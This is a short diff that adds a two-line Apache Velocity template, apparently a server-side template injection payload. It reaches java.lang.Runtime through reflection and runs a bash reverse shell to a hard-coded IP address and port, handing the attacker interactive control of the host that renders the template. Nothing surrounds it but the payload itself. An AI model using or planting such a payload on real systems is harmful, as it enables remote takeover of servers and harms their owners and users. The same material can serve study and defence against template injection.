@@ -1,0 +1,2 @@
+#set($e="e")
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("{/bin/bash -i &> /dev/tcp/118.24.21.16/2334}",null,null).toString();
